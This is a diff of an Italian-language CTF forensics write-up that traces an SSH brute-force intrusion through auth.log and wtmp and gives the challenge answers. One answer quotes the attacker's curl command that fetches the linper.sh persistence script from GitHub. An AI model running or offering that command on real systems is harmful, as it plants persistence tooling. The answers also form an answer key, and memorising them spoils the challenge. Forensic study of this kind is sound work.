@@ -20,7 +20,7 @@ Mar  6 06:31:34 ip-172-31-35-28 sshd[2352]: Failed password for backup from 65.2
 
 Risposta: 65.2.161.68
 
-##2️⃣ The bruteforce attempts were successful. What is the username of the account?
+## 2️⃣ The bruteforce attempts were successful. What is the username of the account?
 
 grep "Accepted password" auth.log
 
@@ -33,7 +33,7 @@ Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie fr
 
 Risposta: root
 
-##3️⃣ Identify the UTC timestamp when the attacker logged in manually
+## 3️⃣ Identify the UTC timestamp when the attacker logged in manually
 
 Uso lo script utmp.py su wtmp:
 
@@ -47,7 +47,7 @@ Output:
 
 Risposta: 2024-03-06 06:32:45 (UTC)
 
-##4️⃣ SSH login sessions are tracked... What is the session number?
+## 4️⃣ SSH login sessions are tracked... What is the session number?
 
 grep "New session" auth.log
 
@@ -57,7 +57,7 @@ Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root
 
 Risposta: 37
 
-##5️⃣ The attacker added a new user. What is the name of this account?
+## 5️⃣ The attacker added a new user. What is the name of this account?
 
 Lo vedo in auth.log:
 
@@ -65,11 +65,11 @@ Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie fr
 
 Risposta: cyberjunkie
 
-##6️⃣ MITRE ATT&CK sub-technique ID for persistence?
+## 6️⃣ MITRE ATT&CK sub-technique ID for persistence?
 
 Risposta: T1136.001 – Create Account: Local Account
 
-##7️⃣ What time did the attacker's first SSH session end?
+## 7️⃣ What time did the attacker's first SSH session end?
 
 Sessione 37, quindi cerco logout in auth.log:
 
@@ -77,7 +77,7 @@ Sessione 37, quindi cerco logout in auth.log:
 
 Risposta: 2024-03-06 06:37:24
 
-##8️⃣ Comando sudo per scaricare uno script
+## 8️⃣ Comando sudo per scaricare uno script
 
 grep 'sudo' auth.log
 
@@ -91,7 +91,7 @@ Risposta:
 
 /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
 
-##🧠 Considerazioni finali
+## 🧠 Considerazioni finali
 
 CTF easy ma utile per ripassare concetti chiave:
 
